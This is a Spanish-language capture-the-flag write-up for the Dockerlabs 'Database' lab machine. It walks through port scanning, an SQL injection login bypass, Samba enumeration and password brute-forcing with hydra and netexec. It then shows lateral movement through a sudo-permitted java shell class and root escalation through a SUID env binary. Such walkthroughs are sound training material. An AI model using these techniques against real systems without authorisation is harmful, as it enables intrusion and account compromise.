# Máquina Database

Dificultad -> Medio

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio
 Una vez descargada la máquina, debemos realizar los siguientes pasos para tener acceso a la máquina:
 
 En primer lugar veremos que tenemos descargado un zip con dos archivos un .sh y un .tar.
 
 ### Archivos
 
.sh → Script de Linux con comandos. Se ejecuta en la terminal.

.tar → Archivo que agrupa otros archivos/carpetas.

Para el despliegue de la máquina tendremos que ejecutar el siguiente comando:
```shell
sudo bash auto_deploy.sh database.tar
```

<img width="718" height="519" alt="imagen" src="https://github.com/user-attachments/assets/c1d746b3-8470-431a-b06f-95a80e82bbda" />


Empezamos reconociendo la máquina objetivo: 

```bash
nmap -sCV -p- --open -min-rate 5000 172.17.0.2 -vvv
```
Descubrimos 4 puertos abiertos en la máquina:

<img width="1588" height="509" alt="imagen" src="https://github.com/user-attachments/assets/052eb763-f1e6-4a73-9efb-3bf12e3596c3" />

Por lo que vemos la web que se aloja en el puerto 80 parece un inicio de sesión puesto que vemos que tiene de título Iniciar Sesión. 

Vamos a echarle un ojo:

<img width="1523" height="620" alt="imagen" src="https://github.com/user-attachments/assets/0102ae57-99ed-4cd4-8965-5c78195e12b9" />

Efectivamente tenemos un panel de login. Con wappalyzer podemos ver con que lenguajes está hecha la página:
<img width="485" height="329" alt="imagen" src="https://github.com/user-attachments/assets/0a295b26-7fdc-46fe-8561-8c32d05df1a9" />

Sobre este inicio de sesión podemos aplicar varias técnicas como fuerza bruta o SQL Injection. Primero vamos a fuzzear la web por si acaso:
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```
 Solo nos encuentra un `index.php` que si lo ponemos en el navegador es el login por defecto. Además eso lo podemos ver en su código fuente (Ctrl+U). No tenemos nada más sobre la web, por lo que vamos a probar las técnicas sobre el login.

Lo primero que vamos a probar es una inyección SQL básica:
```sql
SELECT *
WHERE name = '' OR 1=1 -- '
AND passwd = 'admin'
```

Por tanto en el login vamos a poner:

<img width="437" height="293" alt="imagen" src="https://github.com/user-attachments/assets/d3298310-6a7d-48d1-96f2-d5b8f020de4c" />


Y... conseguimos acceso!
<img width="518" height="147" alt="imagen" src="https://github.com/user-attachments/assets/deb57042-f4b7-4c6b-bbfa-ca1dcd0f6506" />
 
La url ahora es: `http://172.17.0.2/acceso_valido_dylan.php`

Cómo tal no nos lleva a ningún sitio, pero tenemos un nombre de usuario que podemos utilizar ya sea en samba o en ssh.


Vamos a empezar por Samba.

Enumeramos Samba:
```bash
smbclient -L //172.17.0.2 -N   
smbmap -H 172.17.0.2
enum4linux -a 172.17.0.2
```

<img width="1356" height="717" alt="imagen" src="https://github.com/user-attachments/assets/e32f7497-3126-48d4-b491-b245a5fe45f2" />

enum4linux nos ha conseguido 2 usuarios más:

<img width="589" height="84" alt="imagen" src="https://github.com/user-attachments/assets/146605b7-f1b2-4e7e-9701-01d9cbf18cec" />

Ahora tenemos 3 users: dylan, augustus y bob. Por tanto ahora, usando netexec intentaremos obtener passwords de estos tres usuarios en smb:
```bash
nxc smb 172.17.0.2 -u dylan -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
nxc smb 172.17.0.2 -u augustus -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
nxc smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

También podemos probar con hydra para ssh
```bash
hydra -l dylan -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 4
hydra -l augustus -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 4
hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -I -t 4
```

Tras estos comandos encontramos una password para augustus en ssh:
<img width="1593" height="184" alt="imagen" src="https://github.com/user-attachments/assets/7d2f8d97-9091-41af-a8fe-893596444fda" />


```bash
ssh augustus@172.17.0.2
```

Tenemos acceso a esta sesión. Vamos a enumerar la máquina en busca de pivoting de usuarios o escalada de privilegios:
```bash
cat /etc/passwd
```
<img width="1108" height="258" alt="imagen" src="https://github.com/user-attachments/assets/4809039e-d411-4465-971c-71703172be5a" />

Vemos a los tres usuarios que ya sabíamos con una bin/bash:

Probando `sudo -l` encontramos:
<img width="1568" height="253" alt="imagen" src="https://github.com/user-attachments/assets/20ad3bba-ca2f-4bb5-98d0-5e67fc7b1e57" />

Es decir, augustus puede ejecutar Java como el usuario dylan. Todo apunta a que debemos pivotar a dylan:

```bash
sudo -u dylan /usr/bin/java -version    # comprobar que dylan tiene java y su versión
sudo -u dylan /usr/bin/java -cp /tmp Shell   # copiar la ruta de hava a tmp para que nuestro usuario augustus pueda escribir código
```

Si esto funciona vamos a escribir código Java para ser dylan:
```bash
cat > /tmp/Shell.java <<'EOF'
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/bash").inheritIO().start().waitFor();
    }
}
EOF

javac /tmp/Shell.java
```

Ejecutamos:
```bash
sudo -u dylan /usr/bin/java -cp /tmp Shell
```

Somos dylan!

<img width="1194" height="441" alt="imagen" src="https://github.com/user-attachments/assets/8150e01a-d7cd-4f46-a35e-d74357d76136" />

Probamos con `sudo -l` pero ahora no nos dice nada relevante. Probamos otros vectores de escalada de privilegios:
```bash
find / -perm -4000 -user root -type f 2>/dev/null
```
Encontramos algún binario interesante:

<img width="1216" height="349" alt="imagen" src="https://github.com/user-attachments/assets/e7970625-e068-482c-aade-eb8d2f3a8b90" />

Nos podemos aprovechar del `/usr/bin/env` para escalar privilegios:

Podemos buscar en https://gtfobins.org. Buscamos env (shell) y dentro suid:

<img width="949" height="588" alt="imagen" src="https://github.com/user-attachments/assets/396f7dca-cdc0-44b1-9c5b-ddb2d391653a" />

 <img width="744" height="110" alt="imagen" src="https://github.com/user-attachments/assets/f22a9a47-213c-4aea-adef-19f9b1245350" />

Ya seríamos root en la máquina objetivo. Hemos alcanzado privilegios máximos en el sistema!
